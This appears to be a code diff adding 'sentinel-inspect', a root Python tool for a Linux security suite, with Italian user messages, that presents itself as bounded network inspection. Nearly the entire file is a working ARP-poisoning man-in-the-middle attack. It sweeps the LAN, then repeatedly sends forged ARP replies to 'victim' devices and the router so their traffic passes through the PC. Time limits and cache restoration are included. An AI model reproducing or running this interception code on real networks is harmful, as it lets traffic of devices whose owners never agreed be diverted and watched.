@@ -1,0 +1,293 @@
+#!/usr/bin/env python3
+"""CyberDistro Sentinel — bounded, self-healing deep network inspection.
+
+Run via pkexec from the Security Center, only after the user confirms. For a
+number of minutes the user chooses, this routes the LAN's traffic through this
+PC **while forwarding it** (so nothing is cut off), which lets Suricata and Zeek
+see what every device is doing. It stops on its own and restores the network.
+
+    sentinel-inspect start <minutes 1-10> <all|IPv4>
+    sentinel-inspect stop
+    sentinel-inspect status
+
+Guardrails, all enforced here as root:
+  * only a private IPv4 subnet; never this PC, the router or a DNS server;
+  * a hard time limit (SIGALRM) plus a stop command and a SIGTERM handler;
+  * on any exit it disables forwarding and sends corrective ARP so caches heal;
+  * writes /run/sentinel/inspect.json so the GUI can show state and a countdown.
+
+It does NOT decrypt anything: only who-talks-to-whom metadata becomes visible.
+"""
+import json
+import os
+import signal
+import socket
+import struct
+import sys
+import time
+from pathlib import Path
+
+RUN = Path(os.environ.get("SENTINEL_RUN", "/run/sentinel"))
+STATE = RUN / "inspect.json"
+PIDFILE = RUN / "inspect.pid"
+MAX_MIN = 10
+REPOISON_EVERY = 2.0
+ETH_P_ALL = 0x0003
+
+
+def die(msg, code=2):
+    print(msg, file=sys.stderr)
+    sys.exit(code)
+
+
+def default_route():
+    with open("/proc/net/route") as fh:
+        for line in fh.readlines()[1:]:
+            f = line.split()
+            if f[1] == "00000000" and int(f[3], 16) & 2:
+                return f[0], socket.inet_ntoa(struct.pack("<I", int(f[2], 16)))
+    return None, None
+
+
+def iface_ip_mac_mask(dev):
+    import fcntl
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    pack = struct.pack("256s", dev[:15].encode())
+    ip = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, pack)[20:24])
+    mask = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x891B, pack)[20:24])
+    mac = Path(f"/sys/class/net/{dev}/address").read_text().strip()
+    return ip, mac, mask
+
+
+def resolvers():
+    out = set()
+    try:
+        for line in Path("/etc/resolv.conf").read_text().splitlines():
+            f = line.split()
+            if len(f) >= 2 and f[0] == "nameserver":
+                out.add(f[1])
+    except OSError:
+        pass
+    return out
+
+
+def hosts_of(ip, mask):
+    import ipaddress
+    net = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
+    if net.num_addresses > 4096:
+        die("subnet too large to inspect safely")
+    me = ipaddress.IPv4Address(ip)
+    return [str(h) for h in net.hosts() if h != me]
+
+
+def mac_bytes(mac):
+    return bytes(int(x, 16) for x in mac.split(":"))
+
+
+def arp_frame(op, src_mac, src_ip, dst_mac, dst_ip, eth_dst):
+    import ipaddress
+    eth = mac_bytes(eth_dst) + mac_bytes(src_mac) + b"\x08\x06"
+    arp = (struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + mac_bytes(src_mac)
+           + ipaddress.IPv4Address(src_ip).packed + mac_bytes(dst_mac)
+           + ipaddress.IPv4Address(dst_ip).packed)
+    return eth + arp
+
+
+def read_arp_table(dev):
+    """ip -> mac learned by the kernel (after a sweep)."""
+    out = {}
+    try:
+        for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
+            f = line.split()
+            if len(f) >= 6 and f[5] == dev and f[3] != "00:00:00:00:00:00" and int(f[2], 16) & 0x2:
+                out[f[0]] = f[3]
+    except OSError:
+        pass
+    return out
+
+
+def write_state(**kw):
+    RUN.mkdir(parents=True, exist_ok=True)
+    tmp = STATE.with_suffix(".tmp")
+    tmp.write_text(json.dumps(kw))
+    tmp.replace(STATE)
+    try:
+        os.chown(STATE, _sentinel_uid(), _sentinel_gid())
+        STATE.chmod(0o644)
+    except OSError:
+        pass
+
+
+def _sentinel_uid():
+    import pwd
+    return pwd.getpwnam("sentinel").pw_uid
+
+
+def _sentinel_gid():
+    import grp
+    return grp.getgrnam("sentinel").gr_gid
+
+
+def cmd_stop():
+    try:
+        pid = int(PIDFILE.read_text())
+        os.kill(pid, signal.SIGTERM)
+        print(f"Ispezione fermata (pid {pid}).")
+    except (OSError, ValueError):
+        print("Nessuna ispezione in corso.")
+        _clear_state()
+
+
+def cmd_status():
+    print(STATE.read_text() if STATE.exists() else '{"state":"idle"}')
+
+
+def _clear_state():
+    try:
+        PIDFILE.unlink()
+    except OSError:
+        pass
+    write_state(state="idle", updated=time.time())
+
+
+def start(minutes, target):
+    if not (1 <= minutes <= MAX_MIN):
+        die(f"durata non valida (1-{MAX_MIN} minuti)")
+    dev, gw = default_route()
+    if not dev or not gw:
+        die("nessuna rete con router: niente da ispezionare")
+    ip, mac, mask = iface_ip_mac_mask(dev)
+    import ipaddress
+    if not ipaddress.ip_address(ip).is_private:
+        die("l'ispezione è consentita solo su reti private")
+    protected = {ip, gw} | resolvers()
+    if target != "all":
+        if not _is_priv(target):
+            die("indirizzo non valido")
+        if target in protected:
+            die(f"{target} è questo PC, il router o un DNS: non lo ispeziono")
+
+    # Single instance.
+    if PIDFILE.exists():
+        try:
+            os.kill(int(PIDFILE.read_text()), 0)
+            die("un'ispezione è già in corso")
+        except (OSError, ValueError):
+            pass
+    RUN.mkdir(parents=True, exist_ok=True)
+    PIDFILE.write_text(str(os.getpid()))
+
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
+    sock.bind((dev, 0))
+
+    # 1) learn who is on the network (ARP sweep), then read the kernel's table.
+    for h in hosts_of(ip, mask):
+        try:
+            sock.send(arp_frame(1, mac, ip, "00:00:00:00:00:00", h, "ff:ff:ff:ff:ff:ff"))
+        except OSError:
+            break
+    time.sleep(2.5)
+    table = read_arp_table(dev)                 # ip -> real mac
+    gw_mac = table.get(gw)
+    if not gw_mac:
+        _restore(sock, mac, ip, gw, None, {}, dev, forwarding_was="0")
+        die("non ho trovato il router: ispezione annullata")
+
+    if target == "all":
+        victims = {h: m for h, m in table.items() if h not in protected and _is_priv(h)}
+    else:
+        tm = table.get(target)
+        if not tm:
+            _restore(sock, mac, ip, gw, gw_mac, {}, dev, forwarding_was="0")
+            die(f"{target} non risponde: ispezione annullata")
+        victims = {target: tm}
+    if not victims:
+        _restore(sock, mac, ip, gw, gw_mac, {}, dev, forwarding_was="0")
+        die("nessun dispositivo da ispezionare")
+
+    forwarding_was = _read_forwarding()
+    _set_forwarding("1")
+
+    ends = time.time() + minutes * 60
+    write_state(state="running", target=target, devices=len(victims), started=time.time(),
+                ends=ends, minutes=minutes, updated=time.time())
+
+    stop = {"flag": False}
+
+    def _graceful(_s=None, _f=None):
+        stop["flag"] = True
+    signal.signal(signal.SIGTERM, _graceful)
+    signal.signal(signal.SIGINT, _graceful)
+    signal.signal(signal.SIGALRM, _graceful)
+    signal.alarm(minutes * 60 + 5)              # hard backstop above the loop's own clock
+
+    try:
+        while not stop["flag"] and time.time() < ends:
+            for v_ip, v_mac in victims.items():
+                # tell the victim "the router is at my MAC", and the router "the victim is at my MAC"
+                sock.send(arp_frame(2, mac, gw, v_mac, v_ip, v_mac))
+                sock.send(arp_frame(2, mac, v_ip, gw_mac, gw, gw_mac))
+            slept = 0.0
+            while slept < REPOISON_EVERY and not stop["flag"] and time.time() < ends:
+                time.sleep(0.2)
+                slept += 0.2
+    finally:
+        _restore(sock, mac, ip, gw, gw_mac, victims, dev, forwarding_was)
+        sock.close()
+    print("Ispezione terminata e rete ripristinata.")
+
+
+def _restore(sock, mac, ip, gw, gw_mac, victims, dev, forwarding_was):
+    """Heal every poisoned cache: tell each side the real MAC again, several times."""
+    _set_forwarding(forwarding_was or "0")
+    for _ in range(5):
+        for v_ip, v_mac in victims.items():
+            try:
+                if gw_mac:
+                    sock.send(arp_frame(2, gw_mac, gw, v_mac, v_ip, v_mac))      # router -> victim (real)
+                sock.send(arp_frame(2, v_mac, v_ip, gw_mac or "ff:ff:ff:ff:ff:ff", gw, gw_mac or "ff:ff:ff:ff:ff:ff"))
+            except OSError:
+                pass
+        time.sleep(0.3)
+    _clear_state()
+
+
+def _read_forwarding():
+    try:
+        return Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
+    except OSError:
+        return "0"
+
+
+def _set_forwarding(val):
+    try:
+        Path("/proc/sys/net/ipv4/ip_forward").write_text(val + "\n")
+    except OSError:
+        pass
+
+
+def _is_priv(ip):
+    import ipaddress
+    try:
+        return ipaddress.ip_address(ip).version == 4 and ipaddress.ip_address(ip).is_private
+    except ValueError:
+        return False
+
+
+def main(argv):
+    if not argv:
+        die("uso: sentinel-inspect start <minuti> <all|ip> | stop | status")
+    if argv[0] == "stop":
+        cmd_stop()
+        return 0
+    if argv[0] == "status":
+        cmd_status()
+        return 0
+    if argv[0] == "start" and len(argv) == 3:
+        start(int(argv[1]) if argv[1].isdigit() else 0, argv[2])
+        return 0
+    die("uso: sentinel-inspect start <minuti> <all|ip> | stop | status")
+
+
+if __name__ == "__main__":
+    sys.exit(main(sys.argv[1:]))
